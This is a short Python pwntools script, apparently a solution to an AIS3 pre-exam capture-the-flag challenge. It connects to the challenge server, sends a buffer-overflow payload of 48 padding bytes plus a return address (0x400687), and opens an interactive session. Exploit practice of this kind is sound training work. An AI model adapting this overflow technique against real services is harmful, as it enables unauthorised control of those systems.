from pwn import *

conn = remote("pre-exam-pwn.ais3.org", "10000")

conn.recvuntil(".\n")

payload = b"A" * 48 + p64(0x400687)

conn.sendline(payload)

conn.interactive()